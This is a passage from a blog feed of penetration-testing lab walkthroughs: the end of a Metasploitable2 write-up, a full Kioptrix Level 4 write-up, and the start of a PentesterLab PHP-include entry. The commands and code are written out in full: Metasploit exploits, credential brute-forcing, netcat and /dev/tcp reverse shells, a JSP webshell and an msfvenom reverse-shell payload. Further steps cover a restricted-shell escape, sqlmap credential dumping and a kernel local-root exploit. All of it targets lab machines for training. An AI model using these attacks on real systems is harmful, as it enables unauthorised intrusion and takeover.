<p><img src="http://wg135.github.io/images/blog/misc/metasploitable2/Selection_027.png" title="[title manually exploit [alt text]]" ></p>

<h3>Remote shell (port 1524)</h3>

<p>nothing cool,</p>

<p><code>nc 192.168.79.179 1524</code></p>

<p><img src="http://wg135.github.io/images/blog/misc/metasploitable2/Selection_032.png" title="[title manually exploit [alt text]]" ></p>

<h3>Mysql exploit</h3>

<h4>Discover MySQL version:</h4>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; use auxiliary/scanner/mysql/mysql_version
</span><span class='line'>msf auxiliary(mysql_version) &gt; set rhosts 192.168.79.179
</span><span class='line'>msf auxiliary(mysql_version) &gt; run</span></code></pre></td></tr></table></div></figure>


<p><img src="http://wg135.github.io/images/blog/misc/metasploitable2/Selection_010.png" title="[title manually exploit [alt text]]" ></p>

<h4>Brute Force MySQL Login</h4>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; use auxiliary/scanner/mysql/mysql_login
</span><span class='line'>msf auxiliary(mysql_login) &gt; set rhosts 192.168.79.179
</span><span class='line'>msf auxiliary(mysql_login) &gt; set USER_FILE /usr/share/wordlists/rockyou.txt
</span><span class='line'>msf auxiliary(mysql_login) &gt; set PASS_FILE /usr/share/wordlists/rockyou.txt
</span><span class='line'>msf auxiliary(mysql_login) &gt; run</span></code></pre></td></tr></table></div></figure>


<p>get root and guest without setting password</p>

<p><img src="http://wg135.github.io/images/blog/misc/metasploitable2/Selection_011.png" title="[title manually exploit [alt text]]" ></p>

<p>Once get the credential, login to MySQL</p>

<p><code>mysql -h 192.168.79.179 -u root -p</code></p>

<p>In Kali setup nc:</p>

<p><code>nc -nlvp 1234</code></p>

<p>In MySQL, execute system command:</p>

<p><code>mysql&gt; system nc 192.168.79.173 1234 -e /bin/bash</code></p>

<p>get the root:</p>

<p><img src="http://wg135.github.io/images/blog/misc/metasploitable2/Selection_012.png" title="[title manually exploit [alt text]]" ></p>

<h3>distccd (port 3632)</h3>

<p>search distccd, find a exploit <code>exploit/unix/misc/distcc_exec</code></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use exploit/unix/misc/distcc_exec
</span><span class='line'>msf exploit(distcc_exec) &gt; set rhost 192.168.79.179
</span><span class='line'>msf exploit(distcc_exec) &gt; exploit 
</span></code></pre></td></tr></table></div></figure>


<p><img src="http://wg135.github.io/images/blog/misc/metasploitable2/Selection_033.png" title="[title manually exploit [alt text]]" ></p>

<h3>PostgreSQL (port 5432)</h3>

<p>search postgresql, find a module <code>auxiliary/scanner/postgres/postgres_login</code></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; use auxiliary/scanner/postgres/postgres_login
</span><span class='line'>msf auxiliary(postgres_login) &gt; set  RHOSTS 192.168.79.179
</span><span class='line'>msf auxiliary(postgres_login) &gt; run</span></code></pre></td></tr></table></div></figure>


<p><img src="http://wg135.github.io/images/blog/misc/metasploitable2/Selection_034.png" title="[title manually exploit [alt text]]" ></p>

<p>find username/password, login to postgresql.</p>

<p><code>psql -h 192.168.79.179 -U postgres</code></p>

<p><img src="http://wg135.github.io/images/blog/misc/metasploitable2/Selection_035.png" title="[title manually exploit [alt text]]" ></p>

<p>There is another exploit: <code>exploit/linux/postgres/postgres_payload</code></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; use exploit/linux/postgres/postgres_payload
</span><span class='line'>msf exploit(postgres_payload) &gt; set rhost 192.168.79.17
</span><span class='line'>msf exploit(postgres_payload) &gt; exploit</span></code></pre></td></tr></table></div></figure>


<p><img src="http://wg135.github.io/images/blog/misc/metasploitable2/Selection_036.png" title="[title manually exploit [alt text]]" ></p>

<h3>VNC (port 5900)</h3>

<p>search vnc, find a <code>auxiliary/scanner/vnc/vnc_login</code></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; use auxiliary/scanner/vnc/vnc_login
</span><span class='line'>msf auxiliary(vnc_login) &gt; set rhosts 192.168.79.179
</span><span class='line'>msf auxiliary(vnc_login) &gt; run</span></code></pre></td></tr></table></div></figure>


<p>find a password:
<img src="http://wg135.github.io/images/blog/misc/metasploitable2/Selection_037.png" title="[title manually exploit [alt text]]" ></p>

<p>use this password to login vnc</p>

<p><code>vncviewer 192.168.79.179</code></p>

<p><img src="http://wg135.github.io/images/blog/misc/metasploitable2/Selection_038.png" title="[title manually exploit [alt text]]" ></p>

<h3>X11 (Port 6000)</h3>

<p>search x11, find a scanner <code>auxiliary/scanner/x11/open_x11</code></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; use auxiliary/scanner/x11/open_x11
</span><span class='line'>msf auxiliary(open_x11) &gt; set rhosts 192.168.79.179
</span><span class='line'>msf auxiliary(open_x11) &gt; run</span></code></pre></td></tr></table></div></figure>


<p>shows <code>[*] 192.168.79.179:6000   - 192.168.79.179 Access Denied</code></p>

<p>now, try to login use telnet username/password to X11</p>

<p><code>ssh -X -l msfadmin 192.168.79.179</code></p>

<h3>Exploit Apache Tomcat (port 8180)</h3>

<p>use Nikto to scan</p>

<p><code>nikto -h 182.168.79.179:8180</code></p>

<p><img src="http://wg135.github.io/images/blog/misc/metasploitable2/Selection_013.png" title="[title manually exploit [alt text]]" ></p>

<p>defalut credential is found: ID &lsquo;tomcat&rsquo;, PW &lsquo;tomcat&rsquo;.</p>

<p>nagviate to <a href="http://192.168.79.179:8180/manager/html,">http://192.168.79.179:8180/manager/html,</a> input username/password, and we are in:</p>

<p><img src="http://wg135.github.io/images/blog/misc/metasploitable2/Selection_014.png" title="[title manually exploit [alt text]]" ></p>

<p>same shit, generate upload WAR reverse shell backdoor.</p>

<p>create webshell called index.jsp (from pentester lab, you may generate it using msfvenom)</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='jsp'><span class='line'><span class="nt">&lt;FORM</span> <span class="na">METHOD=</span><span class="s">GET</span> <span class="na">ACTION=</span><span class="s">&#39;index.jsp&#39;</span><span class="nt">&gt;</span>
</span><span class='line'><span class="nt">&lt;INPUT</span> <span class="na">name=</span><span class="s">&#39;cmd&#39;</span> <span class="na">type=</span><span class="s">text</span><span class="nt">&gt;</span>
</span><span class='line'><span class="nt">&lt;INPUT</span> <span class="na">type=</span><span class="s">submit</span> <span class="na">value=</span><span class="s">&#39;Run&#39;</span><span class="nt">&gt;</span>
</span><span class='line'><span class="nt">&lt;/FORM&gt;</span>
</span><span class='line'><span class="k">&lt;%@</span> <span class="n">page</span> <span class="n">import</span><span class="o">=</span><span class="s">&quot;java.io.*&quot;</span> <span class="k">%&gt;</span>
</span><span class='line'><span class="k">&lt;%</span>
</span><span class='line'>   <span class="n">String</span> <span class="n">cmd</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">&quot;cmd&quot;</span><span class="o">);</span>
</span><span class='line'>   <span class="n">String</span> <span class="n">output</span> <span class="o">=</span> <span class="s">&quot;&quot;</span><span class="o">;</span>
</span><span class='line'>   <span class="k">if</span><span class="o">(</span><span class="n">cmd</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
</span><span class='line'>      <span class="n">String</span> <span class="n">s</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
</span><span class='line'>      <span class="k">try</span> <span class="o">{</span>
</span><span class='line'>         <span class="n">Process</span> <span class="n">p</span> <span class="o">=</span> <span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="n">cmd</span><span class="o">,</span><span class="kc">null</span><span class="o">,</span><span class="kc">null</span><span class="o">);</span>
</span><span class='line'>         <span class="n">BufferedReader</span> <span class="n">sI</span> <span class="o">=</span> <span class="k">new</span> <span class="nf">BufferedReader</span><span class="o">(</span><span class="k">new</span> <span class="nf">InputStreamReader</span><span class="o">(</span><span class="n">p</span><span class="o">.</span><span class="na">getInputStream</span><span class="o">()));</span>
</span><span class='line'>         <span class="k">while</span><span class="o">((</span><span class="n">s</span> <span class="o">=</span> <span class="n">sI</span><span class="o">.</span><span class="na">readLine</span><span class="o">())</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span> <span class="n">output</span> <span class="o">+=</span> <span class="n">s</span><span class="o">+</span><span class="s">&quot;&lt;/br&gt;&quot;</span><span class="o">;</span> <span class="o">}</span>
</span><span class='line'>      <span class="o">}</span>  <span class="k">catch</span><span class="o">(</span><span class="n">IOException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>   <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>   <span class="o">}</span>
</span><span class='line'>   <span class="o">}</span>
</span><span class='line'><span class="k">%&gt;</span>
</span><span class='line'><span class="nt">&lt;pre&gt;</span><span class="k">&lt;%=</span><span class="n">output</span> <span class="k">%&gt;</span><span class="nt">&lt;/pre&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>now pack the webshell</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='jsp'><span class='line'>mkdir webshell
</span><span class='line'>cp index.jsp webshell
</span><span class='line'>
</span><span class='line'>cd webshell
</span><span class='line'>jar -cvf ../webshell.war *
</span></code></pre></td></tr></table></div></figure>


<p>deploy it and visit <a href="http://192.168.79.179:8180/webshell/index.jsp?">http://192.168.79.179:8180/webshell/index.jsp?</a></p>

<p><img src="http://wg135.github.io/images/blog/misc/metasploitable2/Selection_015.png" title="[title manually exploit [alt text]]" ></p>

<p>use msfvenom to create webshell:</p>

<p><code>msfvenom -p java/jsp_shell_reverse_tcp lhost=192.168.79.173 lport=4444 -f war &gt; webshell1.war</code></p>

<p>setup nc in kali, deploy it and visit <a href="http://192.168.79.179:8180/webshell1/">http://192.168.79.179:8180/webshell1/</a></p>

<p>After connection, get the shell:</p>

<p><code>python -c 'import pty; pty.spawn("/bin/bash")'</code></p>

<p><img src="http://wg135.github.io/images/blog/misc/metasploitable2/Selection_016.png" title="[title manually exploit [alt text]]" ></p>

<p>Use Metasploit:</p>

<p><code>msf &gt; search tomcat</code></p>

<p><img src="http://wg135.github.io/images/blog/misc/metasploitable2/Selection_017.png" title="[title manually exploit [alt text]]" ></p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='jsp'><span class='line'>msf &gt; use exploit/multi/http/tomcat_mgr_upload
</span><span class='line'>msf exploit(tomcat_mgr_upload) &gt; set rhost 192.168.79.179
</span><span class='line'>msf exploit(tomcat_mgr_upload) &gt; set rport 8180
</span><span class='line'>msf exploit(tomcat_mgr_upload) &gt; exploit
</span></code></pre></td></tr></table></div></figure>


<p><img src="http://wg135.github.io/images/blog/misc/metasploitable2/Selection_018.png" title="[title manually exploit [alt text]]" ></p>

<h3>Ruby DRb RMI (port 8787)</h3>

<p>search drb, find an exploit <code>exploit/linux/misc/drb_remote_codeexec</code></p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='jsp'><span class='line'>msf &gt; use exploit/linux/misc/drb_remote_codeexec
</span><span class='line'>msf exploit(drb_remote_codeexec) &gt; set uri druby://192.168.79.179:8787
</span><span class='line'>msf exploit(drb_remote_codeexec) &gt; exploit
</span></code></pre></td></tr></table></div></figure>


<p><img src="http://wg135.github.io/images/blog/misc/metasploitable2/Selection_039.png" title="[title manually exploit [alt text]]" ></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Vulhub Kioptrix Level 4]]></title>
    <link href="http://wg135.github.io/blog/2016/06/15/vulhub-kioptrix-level-4/"/>
    <updated>2016-06-15T16:10:59-05:00</updated>
    <id>http://wg135.github.io/blog/2016/06/15/vulhub-kioptrix-level-4</id>
    <content type="html"><![CDATA[<h3>Tools:</h3>

<ul>
<li>netdiscover</li>
<li>Nmap</li>
<li>wfuzz</li>
<li>nikto</li>
<li>zap</li>
<li>Burpsuite</li>
<li>Sqlmap</li>
</ul>


<!--more-->


<p>Use netdiscover to detect target IP address</p>

<p><code>netdiscover -i eth0 -r 192.168.79.0/24</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/kioptrix4/Selection_001.png" title="[title manually exploit [alt text]]" ></p>

<p>192.168.79.190 is the target.</p>

<p>Then run nmap to detect opening ports and running services on the target machine.</p>

<p><code>nmap -sV -v -O -A -T5 192.168.79.190 -p-</code></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
</pre></td><td class='code'><pre><code class=''><span class='line'># nmap -sV -v -O -A -T5 192.168.79.190 -p-
</span><span class='line'>
</span><span class='line'>Starting Nmap 7.12 ( https://nmap.org ) at 2016-06-15 16:14 CDT
</span><span class='line'>NSE: Loaded 138 scripts for scanning.
</span><span class='line'>NSE: Script Pre-scanning.
</span><span class='line'>Initiating NSE at 16:14
</span><span class='line'>Completed NSE at 16:14, 0.00s elapsed
</span><span class='line'>Initiating NSE at 16:14
</span><span class='line'>Completed NSE at 16:14, 0.00s elapsed
</span><span class='line'>Initiating ARP Ping Scan at 16:14
</span><span class='line'>Scanning 192.168.79.190 [1 port]
</span><span class='line'>Completed ARP Ping Scan at 16:14, 0.00s elapsed (1 total hosts)
</span><span class='line'>Initiating Parallel DNS resolution of 1 host. at 16:14
</span><span class='line'>Completed Parallel DNS resolution of 1 host. at 16:14, 1.99s elapsed
</span><span class='line'>Initiating SYN Stealth Scan at 16:14
</span><span class='line'>Scanning 192.168.79.190 [65535 ports]
</span><span class='line'>Discovered open port 445/tcp on 192.168.79.190
</span><span class='line'>Discovered open port 139/tcp on 192.168.79.190
</span><span class='line'>Discovered open port 80/tcp on 192.168.79.190
</span><span class='line'>Discovered open port 22/tcp on 192.168.79.190
</span><span class='line'>Completed SYN Stealth Scan at 16:14, 11.91s elapsed (65535 total ports)
</span><span class='line'>Initiating Service scan at 16:14
</span><span class='line'>Scanning 4 services on 192.168.79.190
</span><span class='line'>Completed Service scan at 16:14, 11.02s elapsed (4 services on 1 host)
</span><span class='line'>Initiating OS detection (try #1) against 192.168.79.190
</span><span class='line'>NSE: Script scanning 192.168.79.190.
</span><span class='line'>Initiating NSE at 16:14
</span><span class='line'>Completed NSE at 16:15, 15.56s elapsed
</span><span class='line'>Initiating NSE at 16:15
</span><span class='line'>Completed NSE at 16:15, 0.01s elapsed
</span><span class='line'>Nmap scan report for 192.168.79.190
</span><span class='line'>Host is up (0.00033s latency).
</span><span class='line'>Not shown: 39528 closed ports, 26003 filtered ports
</span><span class='line'>PORT    STATE SERVICE     VERSION
</span><span class='line'>22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
</span><span class='line'>| ssh-hostkey: 
</span><span class='line'>|   1024 9b:ad:4f:f2:1e:c5:f2:39:14:b9:d3:a0:0b:e8:41:71 (DSA)
</span><span class='line'>|_  2048 85:40:c6:d5:41:26:05:34:ad:f8:6e:f2:a7:6b:4f:0e (RSA)
</span><span class='line'>80/tcp  open  http        Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
</span><span class='line'>| http-methods: 
</span><span class='line'>|_  Supported Methods: GET HEAD POST OPTIONS
</span><span class='line'>|_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch
</span><span class='line'>|_http-title: Site doesn't have a title (text/html).
</span><span class='line'>139/tcp open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
</span><span class='line'>445/tcp open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
</span><span class='line'>MAC Address: 00:0C:29:EA:4D:22 (VMware)
</span><span class='line'>Device type: general purpose
</span><span class='line'>Running: Linux 2.6.X
</span><span class='line'>OS CPE: cpe:/o:linux:linux_kernel:2.6
</span><span class='line'>OS details: Linux 2.6.9 - 2.6.33
</span><span class='line'>Uptime guess: 0.001 days (since Wed Jun 15 16:13:14 2016)
</span><span class='line'>Network Distance: 1 hop
</span><span class='line'>TCP Sequence Prediction: Difficulty=203 (Good luck!)
</span><span class='line'>IP ID Sequence Generation: All zeros
</span><span class='line'>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span><span class='line'>
</span><span class='line'>Host script results:
</span><span class='line'>| nbstat: NetBIOS name: KIOPTRIX4, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)
</span><span class='line'>| Names:
</span><span class='line'>|   KIOPTRIX4&lt;00&gt;        Flags: &lt;unique&gt;&lt;active&gt;
</span><span class='line'>|   KIOPTRIX4&lt;03&gt;        Flags: &lt;unique&gt;&lt;active&gt;
</span><span class='line'>|   KIOPTRIX4&lt;20&gt;        Flags: &lt;unique&gt;&lt;active&gt;
</span><span class='line'>|   \x01\x02__MSBROWSE__\x02&lt;01&gt;  Flags: &lt;group&gt;&lt;active&gt;
</span><span class='line'>|   WORKGROUP&lt;1d&gt;        Flags: &lt;unique&gt;&lt;active&gt;
</span><span class='line'>|   WORKGROUP&lt;1e&gt;        Flags: &lt;group&gt;&lt;active&gt;
</span><span class='line'>|_  WORKGROUP&lt;00&gt;        Flags: &lt;group&gt;&lt;active&gt;
</span><span class='line'>| smb-os-discovery: 
</span><span class='line'>|   OS: Unix (Samba 3.0.28a)
</span><span class='line'>|   Computer name: Kioptrix4
</span><span class='line'>|   NetBIOS computer name: 
</span><span class='line'>|   Domain name: localdomain
</span><span class='line'>|   FQDN: Kioptrix4.localdomain
</span><span class='line'>|_  System time: 2016-06-15T17:15:00-04:00
</span><span class='line'>| smb-security-mode: 
</span><span class='line'>|   account_used: guest
</span><span class='line'>|   authentication_level: user
</span><span class='line'>|   challenge_response: supported
</span><span class='line'>|_  message_signing: disabled (dangerous, but default)
</span><span class='line'>|_smbv2-enabled: Server doesn't support SMBv2 protocol
</span><span class='line'>
</span><span class='line'>TRACEROUTE
</span><span class='line'>HOP RTT     ADDRESS
</span><span class='line'>1   0.33 ms 192.168.79.190
</span><span class='line'>
</span><span class='line'>NSE: Script Post-scanning.
</span><span class='line'>Initiating NSE at 16:15
</span><span class='line'>Completed NSE at 16:15, 0.00s elapsed
</span><span class='line'>Initiating NSE at 16:15
</span><span class='line'>Completed NSE at 16:15, 0.00s elapsed
</span><span class='line'>Read data files from: /usr/bin/../share/nmap
</span><span class='line'>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span><span class='line'>Nmap done: 1 IP address (1 host up) scanned in 42.54 seconds
</span><span class='line'>           Raw packets sent: 91558 (4.029MB) | Rcvd: 39548 (1.583MB)
</span></code></pre></td></tr></table></div></figure>


<p>Services ssh, http and smb are running.</p>

<h3>check HTTP service:</h3>

<p>use wfuzz to scan:</p>

<p><code>wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --hc 404 http://192.168.79.190/FUZZ 2&gt;/dev/null</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/kioptrix4/Selection_002.png" title="[title manually exploit [alt text]]" ></p>

<p>use nikto to scan:</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/kioptrix4/Selection_003.png" title="[title manually exploit [alt text]]" ></p>

<h3>check SMB service:</h3>

<p>use enum4linux to enumerate SMB:</p>

<p><code>enum4linux -a 192.168.79.190</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/kioptrix4/Selection_004.png" title="[title manually exploit [alt text]]" ></p>

<p>I searched exploitdb and metasploit and tried serveral exploits to SMB, failed.</p>

<p>Now I turn to http service.</p>

<p>use zap to scan:</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/kioptrix4/Selection_005.png" title="[title manually exploit [alt text]]" ></p>

<p>Looks like there is a SQL injection in parameter mypassword.</p>

<p>use Burp to check:</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/kioptrix4/Selection_006.png" title="[title manually exploit [alt text]]" ></p>

<p>save the POST request to a file called test.txt</p>

<p>run sqlmap to dump the credential:</p>

<p><code>sqlmap -r test.txt -p mypassword --dump</code></p>

<p>get:</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/kioptrix4/Selection_007.png" title="[title manually exploit [alt text]]" ></p>

<p>now try to login to web and see if I can upload webshell:</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/kioptrix4/Selection_008.png" title="[title manually exploit [alt text]]" ></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/kioptrix4/Selection_009.png" title="[title manually exploit [alt text]]" ></p>

<p>Nothing excited.</p>

<p>Okay, try to login via SSH:</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/kioptrix4/Selection_010.png" title="[title manually exploit [alt text]]" ></p>

<p>It is an limited shell:</p>

<p>&lsquo;ls -ahlR /root/&rsquo;</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/kioptrix4/Selection_012.png" title="[title manually exploit [alt text]]" ></p>

<p>After google it, I found it may be lshell</p>

<p><a href="https://github.com/ghantoos/lshell">lshell</a></p>

<p>lshell is a shell coded in Python, that lets you restrict a user&rsquo;s environment to limited sets of commands, choose to enable/disable any command over SSH (e.g. SCP, SFTP, rsync, etc.), log user&rsquo;s commands, implement timing restriction, and more.</p>

<p>looks like it support command echo, try to get bash:</p>

<p><code>echo os.system("/bin/bash")</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/kioptrix4/Selection_011.png" title="[title manually exploit [alt text]]" ></p>

<p>Got the shell now!</p>

<p>start to get root&hellip;</p>

<p>Enumeration stage,</p>

<p><code>uname -a</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/kioptrix4/Selection_013.png" title="[title manually exploit [alt text]]" ></p>

<p><code>searchsploit linux kernel 2.6 | grep local</code> and I pick sendpage one</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/kioptrix4/Selection_014.png" title="[title manually exploit [alt text]]" ></p>

<p>download the exploit to /var/www/html/:</p>

<p><code>wget https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/9641.tar.gz</code></p>

<p>start web server:</p>

<p><code>service apache2 start</code></p>

<p>in kioptrix4</p>

<p><code>wget http://192.168.79.173/9641.tar.gz</code></p>

<p>hang there, maybe iptable block the traffic to port 80</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/kioptrix4/Selection_015.png" title="[title manually exploit [alt text]]" ></p>

<p>I tried <code>/bin/bash -i &gt; /dev/tcp/192.168.79.173/1234 0&lt;&amp;1</code> also doesn&rsquo;t work</p>

<p>finally I used python SimpleHTTPServer:</p>

<p><code>service apache2 stop</code>
<code>python -m SimpleHTTPServer</code></p>

<p>in kioptrix4</p>

<p><code>wget 192.168.79.173:8000/9641.tar.gz</code></p>

<p>unzip it:</p>

<p><code>tar zxvf 9641.tar.gz</code></p>

<p>try to compile it, cannot find gcc. WTF</p>

<p>search it</p>

<p><code>whereis gcc</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/kioptrix4/Selection_016.png" title="[title manually exploit [alt text]]" ></p>

<p>this is a folder, and it is i486-linux-gnu, check kioptrix4&rsquo;s architecture.</p>

<p><code>uname -m</code>
It is i686. Oh different&hellip;.</p>

<p>Luckly, my kali is i686, I just compile on my kali and upload to kioptrix4</p>

<p>run it</p>

<p>get the root:</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/kioptrix4/Selection_017.png" title="[title manually exploit [alt text]]" ></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[pentesterlab-PHP-include]]></title>
    <link href="http://wg135.github.io/blog/2016/06/14/pentesterlab-php-include/"/>
    <updated>2016-06-14T12:52:00-05:00</updated>
    <id>http://wg135.github.io/blog/2016/06/14/pentesterlab-php-include</id>
    <content type="html"><![CDATA[<h3>Tools:</h3>

<ul>
<li>netdiscover</li>
<li>Nmap</li>
<li>Nikto</li>
<li>Wfuzz</li>
<li>Netcat</li>
</ul>


<!--more-->


<p>Use netdiscover to detect target IP address</p>

<p><code>netdiscover -i eth0 -r 192.168.79.0/24</code></p>

<p><img src="http://wg135.github.io/images/blog/pentesterlab/phpinclude/Selection_001.png" title="[title manually exploit [alt text]]" ></p>

<p>192.168.79.188 is the target.</p>

<p>Then run nmap to detect opening ports and running services on the target machine.</p>

<p><code>nmap -sV -v -O -A -T5 192.168.79.184 -p-</code></p>

<p><img src="http://wg135.github.io/images/blog/pentesterlab/phpinclude/Selection_002.png" title="[title manually exploit [alt text]]" ></p>

<p>Only port 80 is opening.</p>

<p>Use Wfuzz to scan</p>

<p><code>wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --hc 404 http://192.168.79.188/FUZZ 2&gt;/dev/null</code></p>

<p><img src="http://wg135.github.io/images/blog/pentesterlab/phpinclude/Selection_003.png" title="[title manually exploit [alt text]]" ></p>

<p>use nikto to scan</p>

<p><code>nikto -h 192.168.79.188</code></p>

<p>looks like there is a php include vulnerability</p>

